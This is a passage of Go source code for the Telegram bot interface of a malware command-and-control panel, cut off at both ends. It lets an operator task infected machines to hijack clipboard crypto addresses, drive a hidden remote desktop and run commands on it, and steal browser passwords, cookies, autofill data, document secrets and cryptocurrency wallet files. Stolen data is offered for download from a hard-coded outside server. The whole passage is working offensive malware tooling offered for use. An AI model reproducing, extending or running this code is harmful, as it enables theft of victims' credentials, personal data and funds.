			message += fmt.Sprintf("🟣 **SOL:** `%s`\n", config.SOL)
		}
		if config.LTC != "" {
			message += fmt.Sprintf("⚪ **LTC:** `%s`\n", config.LTC)
		}
	}

	if config.DefaultAddress == "" && config.BTC == "" && config.ETH == "" && config.SOL == "" && config.LTC == "" {
		message = "❌ *No crypto addresses configured*\nUse option `1` or `2` to set up addresses first."
	}

	session.WaitingFor = ""
	tb.sendMessage(chatID, message)
}

func (tb *TelegramBot) startClipboardReplacement(chatID int64) {
	session := tb.getSession(chatID)

	if session.CryptoConfig == nil || (session.CryptoConfig.DefaultAddress == "" &&
		session.CryptoConfig.BTC == "" && session.CryptoConfig.ETH == "" &&
		session.CryptoConfig.SOL == "" && session.CryptoConfig.LTC == "") {
		tb.sendMessage(chatID, "❌ *No crypto addresses configured*\nSet up addresses first using option `1` or `2`")
		return
	}

	session.WaitingFor = "crypto_replacement_duration"
	tb.sendMessage(chatID,
		"⏱️ *How long should clipboard replacement run?*\n\n"+
			"Enter duration in seconds (e.g., `60` for 1 minute):")
}

func (tb *TelegramBot) handleReplacementDuration(chatID int64, input string) {
	session := tb.getSession(chatID)

	seconds, err := strconv.Atoi(input)
	if err != nil || seconds <= 0 || seconds > 3600 {
		tb.sendMessage(chatID, "❌ *Invalid duration*\nEnter a number between 1-3600 seconds:")
		return
	}

	// Create task with crypto configuration
	params := map[string]interface{}{
		"duration": seconds,
	}

	task := &config.Task{
		Type:        config.TASK_CLIPBOARD_REPLACE,
		Parameters:  params,
		CryptoAddrs: session.CryptoConfig,
	}

	taskID := tb.c2Server.AddTaskWithConfig(session.SelectedAgent, task)

	session.WaitingFor = ""

	tb.sendMessage(chatID, fmt.Sprintf(
		"💰 *Clipboard replacement ACTIVE for %d seconds!*\n\n"+
			"🆔 Task ID: `%s`\n\n"+
			"🎯 **Target addresses will be replaced with:**\n%s\n\n"+
			"⚡ Monitoring clipboard for crypto addresses...",
		seconds, taskID[:8], tb.formatCryptoConfig(session.CryptoConfig)))

	go tb.waitForTaskResult(chatID, taskID, time.Duration(seconds+30)*time.Second)
}

func (tb *TelegramBot) formatCryptoConfig(config *config.CryptoAddresses) string {
	if config.DefaultAddress != "" {
		return fmt.Sprintf("🔄 **Universal:** `%s`", config.DefaultAddress)
	}

	result := ""
	if config.BTC != "" {
		result += fmt.Sprintf("🟠 **BTC:** `%s`\n", config.BTC)
	}
	if config.ETH != "" {
		result += fmt.Sprintf("🔵 **ETH:** `%s`\n", config.ETH)
	}
	if config.SOL != "" {
		result += fmt.Sprintf("🟣 **SOL:** `%s`\n", config.SOL)
	}
	if config.LTC != "" {
		result += fmt.Sprintf("⚪ **LTC:** `%s`", config.LTC)
	}

	return result
}

func (tb *TelegramBot) formatExistingSpecificAddresses(config *config.CryptoAddresses) string {
	result := ""
	if config.BTC != "" {
		result += fmt.Sprintf("🟠 **BTC:** `%s`\n", config.BTC)
	}
	if config.ETH != "" {
		result += fmt.Sprintf("🔵 **ETH:** `%s`\n", config.ETH)
	}
	if config.SOL != "" {
		result += fmt.Sprintf("🟣 **SOL:** `%s`\n", config.SOL)
	}
	if config.LTC != "" {
		result += fmt.Sprintf("⚪ **LTC:** `%s`", config.LTC)
	}
	return result
}

func (tb *TelegramBot) handleConfirmClearUniversal(chatID int64, input string) {
	session := tb.getSession(chatID)

	switch strings.ToLower(input) {
	case "yes", "y":
		// Clear universal address and proceed with specific setup
		session.CryptoConfig.DefaultAddress = ""
		tb.startAdvancedCryptoSetup(chatID)
		tb.sendMessage(chatID, "✅ *Universal address cleared!* Proceeding with specific address setup...")
	case "no", "n":
		// Cancel and return to main menu
		session.WaitingFor = "crypto_setup_choice"
		tb.sendMessage(chatID,
			"❌ *Setup cancelled*\n\n"+
				"💰 *CRYPTO ADDRESS REPLACEMENT SETUP*\n\n"+
				"Choose how to configure replacement addresses:\n\n"+
				"1️⃣ **Quick Setup** - One address replaces ALL crypto types\n"+
				"2️⃣ **Advanced Setup** - Configure specific addresses per crypto\n"+
				"3️⃣ **View Current** - Show current configuration\n"+
				"4️⃣ **Start Replacement** - Begin clipboard monitoring\n\n"+
				"*Reply with:* `1`, `2`, `3`, or `4`")
	default:
		tb.sendMessage(chatID, "❌ *Invalid response*\nReply with `yes` to confirm or `no` to cancel.")
	}
}

func (tb *TelegramBot) handleConfirmClearSpecific(chatID int64, input string) {
	session := tb.getSession(chatID)

	switch strings.ToLower(input) {
	case "yes", "y":
		// Clear specific addresses and proceed with universal setup
		session.CryptoConfig.BTC = ""
		session.CryptoConfig.ETH = ""
		session.CryptoConfig.SOL = ""
		session.CryptoConfig.LTC = ""

		session.WaitingFor = "crypto_default_address"
		tb.sendMessage(chatID,
			"✅ *Specific addresses cleared!* Proceeding with universal address setup...\n\n"+
				"💰 *QUICK SETUP - Universal Address*\n\n"+
				"Enter ONE address that will replace ALL crypto addresses:\n"+
				"(BTC, ETH, SOL, LTC, etc.)\n\n"+
				"*Example:* `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`")
	case "no", "n":
		// Cancel and return to main menu
		session.WaitingFor = "crypto_setup_choice"
		tb.sendMessage(chatID,
			"❌ *Setup cancelled*\n\n"+
				"💰 *CRYPTO ADDRESS REPLACEMENT SETUP*\n\n"+
				"Choose how to configure replacement addresses:\n\n"+
				"1️⃣ **Quick Setup** - One address replaces ALL crypto types\n"+
				"2️⃣ **Advanced Setup** - Configure specific addresses per crypto\n"+
				"3️⃣ **View Current** - Show current configuration\n"+
				"4️⃣ **Start Replacement** - Begin clipboard monitoring\n\n"+
				"*Reply with:* `1`, `2`, `3`, or `4`")
	default:
		tb.sendMessage(chatID, "❌ *Invalid response*\nReply with `yes` to confirm or `no` to cancel.")
	}
}

func (tb *TelegramBot) handleTerminate(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_TERMINATE, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"💀 *Terminating agent*\n🆔 Task ID: `%s`\n\n⚠️ Agent will shut down after completing current tasks...",
		taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 30*time.Second)
}

// =============================================================================
// HVNC Command Handlers
// =============================================================================

// handleHVNCStart starts a hidden desktop session
func (tb *TelegramBot) handleHVNCStart(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_HVNC_START, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🖥️ *Starting HVNC session...*\n🆔 Task ID: `%s`\n\n⏳ Please wait while the hidden desktop is created...",
		taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 30*time.Second)
}

// handleHVNCStop stops the hidden desktop session
func (tb *TelegramBot) handleHVNCStop(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_HVNC_STOP, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🛑 *Stopping HVNC session...*\n🆔 Task ID: `%s`",
		taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 15*time.Second)
}

// handleHVNCScreenshot takes a screenshot from the hidden desktop
func (tb *TelegramBot) handleHVNCScreenshot(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_HVNC_SCREENSHOT, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"📸 *Capturing HVNC screenshot...*\n🆔 Task ID: `%s`",
		taskID[:8],
	))

	go tb.waitForHVNCScreenshotResult(chatID, taskID, 30*time.Second)
}

// handleHVNCMouse handles mouse events in the hidden desktop
func (tb *TelegramBot) handleHVNCMouse(chatID int64, args []string) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	// Parse mouse event arguments
	var x, y int
	var button, action string
	var err error

	if len(args) == 3 {
		// Format: /hvncmouse x y action (for move)
		x, err = strconv.Atoi(args[0])
		if err != nil {
			tb.sendMessage(chatID, "❌ *Invalid X coordinate*")
			return
		}
		y, err = strconv.Atoi(args[1])
		if err != nil {
			tb.sendMessage(chatID, "❌ *Invalid Y coordinate*")
			return
		}
		action = args[2]
		button = "left" // Default
	} else if len(args) == 4 {
		// Format: /hvncmouse x y button action
		x, err = strconv.Atoi(args[0])
		if err != nil {
			tb.sendMessage(chatID, "❌ *Invalid X coordinate*")
			return
		}
		y, err = strconv.Atoi(args[1])
		if err != nil {
			tb.sendMessage(chatID, "❌ *Invalid Y coordinate*")
			return
		}
		button = args[2]
		action = args[3]
	} else {
		tb.sendMessage(chatID, "❌ *Invalid arguments*\nUse `/hvncmouse <x> <y> <action>` or `/hvncmouse <x> <y> <button> <action>`")
		return
	}

	// Validate action
	validActions := []string{"move", "click", "double", "down", "up"}
	if !contains(validActions, action) {
		tb.sendMessage(chatID, "❌ *Invalid action*\nValid actions: move, click, double, down, up")
		return
	}

	// Validate button
	validButtons := []string{"left", "right", "middle"}
	if !contains(validButtons, button) {
		tb.sendMessage(chatID, "❌ *Invalid button*\nValid buttons: left, right, middle")
		return
	}

	// Create mouse event
	mouseEvent := &config.HVNCMouseEvent{
		X:      x,
		Y:      y,
		Button: button,
		Action: action,
	}

	// Create task with mouse event data
	task := &config.Task{
		ID:        config.GenerateID(),
		AgentID:   session.SelectedAgent,
		Type:      config.TASK_HVNC_MOUSE,
		HVNCMouse: mouseEvent,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	// Add task with mouse event data
	taskID := tb.c2Server.AddTaskWithConfig(session.SelectedAgent, task)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🖱️ *HVNC Mouse Event*\n📍 Position: (%d, %d)\n🔲 Button: %s\n⚡ Action: %s\n🆔 Task ID: `%s`",
		x, y, button, action, taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 15*time.Second)
}

// handleHVNCKeyboard handles keyboard events in the hidden desktop
func (tb *TelegramBot) handleHVNCKeyboard(chatID int64, args []string) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	if len(args) < 2 {
		tb.sendMessage(chatID, "❌ *Invalid arguments*\nUse `/hvnckbd <action> <key/text>`")
		return
	}

	action := args[0]

	// Validate action
	validActions := []string{"press", "down", "up", "type"}
	if !contains(validActions, action) {
		tb.sendMessage(chatID, "❌ *Invalid action*\nValid actions: press, down, up, type")
		return
	}

	var keyEvent *config.HVNCKeyboardEvent

	if action == "type" {
		// For typing, join all remaining args as text
		text := strings.Join(args[1:], " ")
		keyEvent = &config.HVNCKeyboardEvent{
			Action: action,
			Text:   text,
		}
	} else {
		// For key presses, use single key
		key := args[1]
		keyEvent = &config.HVNCKeyboardEvent{
			Action: action,
			Key:    key,
		}
	}

	// Create task with keyboard event data
	task := &config.Task{
		ID:           config.GenerateID(),
		AgentID:      session.SelectedAgent,
		Type:         config.TASK_HVNC_KEYBOARD,
		HVNCKeyboard: keyEvent,
		Status:       "pending",
		CreatedAt:    time.Now(),
	}

	// Add task with keyboard event data
	taskID := tb.c2Server.AddTaskWithConfig(session.SelectedAgent, task)

	var description string
	if action == "type" {
		description = fmt.Sprintf("⌨️ *HVNC Keyboard*\n📝 Action: %s\n💬 Text: `%s`\n🆔 Task ID: `%s`",
			action, keyEvent.Text, taskID[:8])
	} else {
		description = fmt.Sprintf("⌨️ *HVNC Keyboard*\n📝 Action: %s\n🔑 Key: %s\n🆔 Task ID: `%s`",
			action, keyEvent.Key, taskID[:8])
	}

	tb.sendMessage(chatID, description)
	go tb.waitForTaskResult(chatID, taskID, 15*time.Second)
}

// handleHVNCExecute executes a command in the hidden desktop
func (tb *TelegramBot) handleHVNCExecute(chatID int64, command string) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_HVNC_EXECUTE, command, nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🚀 *HVNC Execute*\n💻 Command: `%s`\n🆔 Task ID: `%s`\n\n⏳ Executing in hidden desktop...",
		command, taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 30*time.Second)
}

// waitForHVNCScreenshotResult waits for HVNC screenshot task completion
func (tb *TelegramBot) waitForHVNCScreenshotResult(chatID int64, taskID string, timeout time.Duration) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	timeoutChan := time.After(timeout)

	for {
		select {
		case <-ticker.C:
			if result := tb.c2Server.GetTaskResult(taskID); result != nil {
				if result.Success {
					if result.ScreenshotData != "" {
						// Decode base64 screenshot
						imageData, err := base64.StdEncoding.DecodeString(result.ScreenshotData)
						if err != nil {
							tb.sendMessage(chatID, fmt.Sprintf("❌ *Failed to decode HVNC screenshot:* %v", err))
							return
						}

						// Send image
						photo := tgbotapi.NewPhoto(chatID, tgbotapi.FileBytes{
							Name:  fmt.Sprintf("hvnc_screenshot_%s.png", taskID[:8]),
							Bytes: imageData,
						})
						photo.Caption = fmt.Sprintf("🖥️ *HVNC Screenshot*\n🆔 Task: `%s`\n📏 %s", taskID[:8], result.Output)

						if _, err := tb.bot.Send(photo); err != nil {
							tb.sendMessage(chatID, fmt.Sprintf("❌ *Failed to send HVNC screenshot:* %v", err))
						}
					} else {
						tb.sendMessage(chatID, fmt.Sprintf("✅ *HVNC Screenshot Result*\n📸 %s", result.Output))
					}
				} else {
					tb.sendMessage(chatID, fmt.Sprintf("❌ *HVNC Screenshot Failed*\n💥 %s", result.Error))
				}
				return
			}
		case <-timeoutChan:
			tb.sendMessage(chatID, "⏰ *HVNC screenshot timeout* - Task may still be running")
			return
		}
	}
}

// Helper function to check if slice contains string
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// Credential Theft Handlers

// handleStealPasswords initiates browser password theft
func (tb *TelegramBot) handleStealPasswords(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_BROWSER_PASSWORDS, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🔐 *Extracting browser passwords...*\n🆔 Task ID: `%s`\n\n"+
			"⏳ This may take a few moments...",
		taskID[:8],
	))

	go tb.waitForCredentialResult(chatID, taskID, 60*time.Second, "passwords")
}

// handleStealCookies initiates browser cookie theft
func (tb *TelegramBot) handleStealCookies(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_BROWSER_COOKIES, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🍪 *Extracting browser cookies...*\n🆔 Task ID: `%s`\n\n"+
			"⏳ This may take a few moments...",
		taskID[:8],
	))

	go tb.waitForCredentialResult(chatID, taskID, 60*time.Second, "cookies")
}

// handleStealAutofill initiates browser autofill data theft
func (tb *TelegramBot) handleStealAutofill(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_BROWSER_AUTOFILL, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"📝 *Extracting autofill data...*\n🆔 Task ID: `%s`\n\n"+
			"⏳ This may take a few moments...",
		taskID[:8],
	))

	go tb.waitForCredentialResult(chatID, taskID, 60*time.Second, "autofill")
}

// handleStealDocs initiates document password scanning
func (tb *TelegramBot) handleStealDocs(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_DOCUMENT_PASSWORDS, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"📄 *Scanning documents for passwords...*\n🆔 Task ID: `%s`\n\n"+
			"⏳ This may take several minutes...",
		taskID[:8],
	))

	go tb.waitForCredentialResult(chatID, taskID, 180*time.Second, "documents")
}

// handleStealAll initiates comprehensive credential theft
func (tb *TelegramBot) handleStealAll(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_ALL_CREDENTIALS, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"💀 *COMPREHENSIVE CREDENTIAL THEFT INITIATED*\n🆔 Task ID: `%s`\n\n"+
			"🔐 Extracting browser passwords...\n"+
			"🍪 Extracting browser cookies...\n"+
			"📝 Extracting autofill data...\n"+
			"📄 Scanning documents...\n\n"+
			"⏳ This operation may take several minutes...",
		taskID[:8],
	))

	go tb.waitForCredentialResult(chatID, taskID, 300*time.Second, "comprehensive")
}

// handleStealWallets initiates hot wallet detection and theft
func (tb *TelegramBot) handleStealWallets(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_STEAL_HOT_WALLETS, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"💰 *HOT WALLET DETECTION & THEFT INITIATED*\n🆔 Task ID: `%s`\n\n"+
			"🔍 Scanning for installed wallets...\n"+
			"📁 Detecting wallet data directories...\n"+
			"🔐 Extracting wallet files...\n"+
			"🗝️ Collecting keystore files...\n"+
			"💾 Gathering backup files...\n\n"+
			"⏳ This operation may take several minutes...",
		taskID[:8],
	))

	go tb.waitForWalletResult(chatID, taskID, 300*time.Second)
}

// waitForCredentialResult waits for credential theft task completion
func (tb *TelegramBot) waitForCredentialResult(chatID int64, taskID string, timeout time.Duration, dataType string) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	timeoutTimer := time.NewTimer(timeout)
	defer timeoutTimer.Stop()

	for {
		select {
		case <-ticker.C:
			result := tb.c2Server.GetTaskResult(taskID)
			if result != nil {
				if result.Success {
					tb.formatAndSendCredentialData(chatID, result, dataType)
				} else {
					tb.sendMessage(chatID, fmt.Sprintf(
						"❌ *Credential theft failed*\n🆔 Task: `%s`\n\n"+
							"**Error:** %s",
						taskID[:8], result.Error,
					))
				}
				return
			}

		case <-timeoutTimer.C:
			tb.sendMessage(chatID, fmt.Sprintf(
				"⏰ *Credential theft timed out*\n🆔 Task: `%s`\n\n"+
					"The operation took longer than expected.",
				taskID[:8],
			))
			return
		}
	}
}

// formatAndSendCredentialData formats and sends stolen credential data
func (tb *TelegramBot) formatAndSendCredentialData(chatID int64, result *config.TaskResult, dataType string) {
	if result.CredentialData == nil {
		tb.sendMessage(chatID, fmt.Sprintf(
			"✅ *%s extraction complete*\n\n%s",
			strings.Title(dataType), result.Output,
		))
		return
	}

	creds := result.CredentialData
	var message strings.Builder

	message.WriteString(fmt.Sprintf("✅ *%s EXTRACTION COMPLETE*\n\n", strings.ToUpper(dataType)))

	// Summary counts
	totalPasswords := len(creds.BrowserPasswords)
	totalCookies := len(creds.BrowserCookies)
	totalAutofill := len(creds.AutofillData)
	totalDocuments := len(creds.DocumentData)
	totalItems := totalPasswords + totalCookies + totalAutofill + totalDocuments

	message.WriteString("📊 *SUMMARY*\n")
	message.WriteString(fmt.Sprintf("🔐 Passwords: %d\n", totalPasswords))
	message.WriteString(fmt.Sprintf("🍪 Cookies: %d\n", totalCookies))
	message.WriteString(fmt.Sprintf("📝 Autofill: %d\n", totalAutofill))
	message.WriteString(fmt.Sprintf("📄 Documents: %d\n", totalDocuments))
	message.WriteString(fmt.Sprintf("📈 **Total: %d items**\n\n", totalItems))

	// Show limited preview for each category
	const previewLimit = 3

	// Browser Passwords Preview
	if totalPasswords > 0 {
		message.WriteString("🔐 *PASSWORDS PREVIEW*\n")
		for i, pwd := range creds.BrowserPasswords {
			if i >= previewLimit {
				break
			}
			message.WriteString(fmt.Sprintf("• `%s` - %s@%s\n", pwd.Browser, pwd.Username, pwd.URL))
		}
		if totalPasswords > previewLimit {
			message.WriteString(fmt.Sprintf("  ⬇️ *%d more passwords available in download*\n", totalPasswords-previewLimit))
		}
		message.WriteString("\n")
	}

	// Browser Cookies Preview (by host)
	if totalCookies > 0 {
		message.WriteString("🍪 *COOKIES PREVIEW*\n")
		hostCount := make(map[string]int)
		for _, cookie := range creds.BrowserCookies {
			hostCount[cookie.Host]++
		}

		i := 0
		for host, count := range hostCount {
			if i >= previewLimit {
				break
			}
			message.WriteString(fmt.Sprintf("• `%s` (%d cookies)\n", host, count))
			i++
		}
		if len(hostCount) > previewLimit {
			message.WriteString(fmt.Sprintf("  ⬇️ *%d more hosts available in download*\n", len(hostCount)-previewLimit))
		}
		message.WriteString("\n")
	}

	// Autofill Data Preview
	if totalAutofill > 0 {
		message.WriteString("📝 *AUTOFILL PREVIEW*\n")
		for i, autofill := range creds.AutofillData {
			if i >= previewLimit {
				break
			}
			displayInfo := autofill.Name
			if displayInfo == "" && autofill.Email != "" {
				displayInfo = autofill.Email
			}
			if displayInfo == "" {
				displayInfo = "Unknown"
			}
			message.WriteString(fmt.Sprintf("• `%s` - %s\n", autofill.Browser, displayInfo))
		}
		if totalAutofill > previewLimit {
			message.WriteString(fmt.Sprintf("  ⬇️ *%d more entries available in download*\n", totalAutofill-previewLimit))
		}
		message.WriteString("\n")
	}

	// Document Data Preview
	if totalDocuments > 0 {
		message.WriteString("📄 *DOCUMENTS PREVIEW*\n")
		for i, doc := range creds.DocumentData {
			if i >= previewLimit {
				break
			}
			sensitiveCount := len(doc.Passwords) + len(doc.EmailAddresses) + len(doc.CreditCards) + len(doc.SSNs) + len(doc.PhoneNumbers)
			if sensitiveCount > 0 {
				message.WriteString(fmt.Sprintf("• `%s` (%d secrets)\n", doc.FileName, sensitiveCount))
			}
		}
		if totalDocuments > previewLimit {
			message.WriteString(fmt.Sprintf("  ⬇️ *%d more documents available in download*\n", totalDocuments-previewLimit))
		}
		message.WriteString("\n")
	}

	// Download links section
	if result.CredentialFiles != nil && len(result.CredentialFiles) > 0 {
		message.WriteString("💾 *DOWNLOAD COMPLETE DATA*\n")
		message.WriteString("Click links below to download organized credential files:\n\n")

		if txtFile, exists := result.CredentialFiles["txt"]; exists {
			txtURL := fmt.Sprintf("http://212.102.255.215:8080/credentials/%s", txtFile)
			message.WriteString(fmt.Sprintf("📄 [Download Organized Report (.txt)](%s)\n", txtURL))
			message.WriteString("   └ Human-readable format with organized sections\n\n")
		}

		if jsonFile, exists := result.CredentialFiles["json"]; exists {
			jsonURL := fmt.Sprintf("http://212.102.255.215:8080/credentials/%s", jsonFile)
			message.WriteString(fmt.Sprintf("💻 [Download Raw Data (.json)](%s)\n", jsonURL))
			message.WriteString("   └ Machine-readable format for tools/scripts\n\n")
		}
	}

	// Timestamp
	message.WriteString(fmt.Sprintf("⏰ *Extracted at:* %s", time.Unix(creds.Timestamp, 0).Format("2006-01-02 15:04:05")))

	// Send the message
	messageText := message.String()

	// If message is too long, send summary and download links only
	if len(messageText) > 4000 {
		summaryMsg := fmt.Sprintf("✅ *%s EXTRACTION COMPLETE*\n\n", strings.ToUpper(dataType))
		summaryMsg += fmt.Sprintf("📊 **SUMMARY**: %d total items stolen\n", totalItems)
		summaryMsg += fmt.Sprintf("🔐 Passwords: %d | 🍪 Cookies: %d\n", totalPasswords, totalCookies)
		summaryMsg += fmt.Sprintf("📝 Autofill: %d | 📄 Documents: %d\n\n", totalAutofill, totalDocuments)

		if result.CredentialFiles != nil && len(result.CredentialFiles) > 0 {
			summaryMsg += "💾 *DOWNLOAD COMPLETE DATA*\n"

			if txtFile, exists := result.CredentialFiles["txt"]; exists {
				txtURL := fmt.Sprintf("http://212.102.255.215:8080/credentials/%s", txtFile)
				summaryMsg += fmt.Sprintf("📄 [Download Organized Report (.txt)](%s)\n", txtURL)
			}

			if jsonFile, exists := result.CredentialFiles["json"]; exists {
				jsonURL := fmt.Sprintf("http://212.102.255.215:8080/credentials/%s", jsonFile)
				summaryMsg += fmt.Sprintf("💻 [Download Raw Data (.json)](%s)\n", jsonURL)
			}
		}

		summaryMsg += fmt.Sprintf("\n⏰ *Extracted:* %s", time.Unix(creds.Timestamp, 0).Format("2006-01-02 15:04:05"))
		tb.sendMessage(chatID, summaryMsg)
	} else {
		tb.sendMessage(chatID, messageText)
	}
}

// waitForWalletResult waits for hot wallet theft task completion
func (tb *TelegramBot) waitForWalletResult(chatID int64, taskID string, timeout time.Duration) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	timeoutTimer := time.NewTimer(timeout)
	defer timeoutTimer.Stop()

	for {
		select {
		case <-ticker.C:
			result := tb.c2Server.GetTaskResult(taskID)
			if result != nil {
				if result.Success {
					tb.formatAndSendWalletData(chatID, result)
				} else {
					tb.sendMessage(chatID, fmt.Sprintf(
						"❌ *Hot wallet theft failed*\n🆔 Task: `%s`\n\n"+
							"**Error:** %s",
						taskID[:8], result.Error,
					))
				}
				return
			}

		case <-timeoutTimer.C:
			tb.sendMessage(chatID, fmt.Sprintf(
				"⏰ *Hot wallet theft timed out*\n🆔 Task: `%s`\n\n"+
					"The operation took longer than expected.",
				taskID[:8],
			))
			return
		}
	}
}

// formatAndSendWalletData formats and sends hot wallet theft results with download options
func (tb *TelegramBot) formatAndSendWalletData(chatID int64, result *config.TaskResult) {
	if result.WalletData == nil {
		tb.sendMessage(chatID, "❌ No wallet data received")
		return
	}

	walletData := result.WalletData

	// Create main summary message
	message := fmt.Sprintf("💰 *HOT WALLET THEFT COMPLETE*\n\n")
	message += fmt.Sprintf("📊 *SUMMARY*\n")
	message += fmt.Sprintf("🏦 Wallets detected: %d\n", walletData.TotalWallets)
	message += fmt.Sprintf("📁 Files stolen: %d\n", walletData.TotalFiles)
	message += fmt.Sprintf("💾 Total size: %.2f MB\n\n", float64(walletData.TotalSizeBytes)/1024/1024)

	if len(walletData.DetectedWallets) > 0 {
		message += "🏦 *DETECTED WALLETS*\n"
		for _, wallet := range walletData.DetectedWallets {
			message += fmt.Sprintf("• *%s* (%s)\n", wallet.WalletName, wallet.WalletType)

			statusEmoji := "🔴"
			statusText := "Not Installed"
			if wallet.IsInstalled {
				if wallet.IsRunning {
					statusEmoji = "🟢"
					statusText = "Running"
				} else {
					statusEmoji = "🟡"
					statusText = "Installed"
				}
			}
			message += fmt.Sprintf("  └ Status: %s %s\n", statusEmoji, statusText)

			if wallet.TotalFilesFound > 0 {
				message += fmt.Sprintf("  └ Files: %d (%.2f KB)\n", wallet.TotalFilesFound, float64(wallet.TotalSizeBytes)/1024)

				// Show file type breakdown
				fileTypes := []string{}
				if len(wallet.ConfigFiles) > 0 {
					fileTypes = append(fileTypes, fmt.Sprintf("Config(%d)", len(wallet.ConfigFiles)))
				}
				if len(wallet.WalletFiles) > 0 {
					fileTypes = append(fileTypes, fmt.Sprintf("Wallet(%d)", len(wallet.WalletFiles)))
				}
				if len(wallet.KeystoreFiles) > 0 {
					fileTypes = append(fileTypes, fmt.Sprintf("Keystore(%d)", len(wallet.KeystoreFiles)))
				}
				if len(wallet.BackupFiles) > 0 {
					fileTypes = append(fileTypes, fmt.Sprintf("Backup(%d)", len(wallet.BackupFiles)))
				}
				if len(wallet.LogFiles) > 0 {
					fileTypes = append(fileTypes, fmt.Sprintf("Log(%d)", len(wallet.LogFiles)))
				}

				if len(fileTypes) > 0 {
					message += fmt.Sprintf("  └ Types: %s\n", strings.Join(fileTypes, ", "))
				}
			}
			message += "\n"
		}
	}

	if walletData.TotalFiles > 0 {
		message += "💾 *STOLEN FILES*\n"
		message += "All wallet files have been extracted and are ready for analysis.\n"
		message += "Files include configuration, wallet data, keystores, and backups.\n\n"

		// Add download buttons for different formats
		message += "📥 *DOWNLOAD OPTIONS*\n"
		message += "Use the buttons below to download wallet data in different formats.\n\n"
	}

	message += fmt.Sprintf("⏰ Extracted at: %s", time.Unix(walletData.Timestamp, 0).Format("2006-01-02 15:04:05"))

	// Create inline keyboard for download options
	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📄 JSON", fmt.Sprintf("download_json_%s", result.TaskID)),
			tgbotapi.NewInlineKeyboardButtonData("📝 TXT", fmt.Sprintf("download_txt_%s", result.TaskID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📁 RAW Files", fmt.Sprintf("download_raw_%s", result.TaskID)),
			tgbotapi.NewInlineKeyboardButtonData("🔍 View Files", fmt.Sprintf("view_files_%s", result.TaskID)),
		),
	)

	// Send message with download buttons
	msg := tgbotapi.NewMessage(chatID, message)
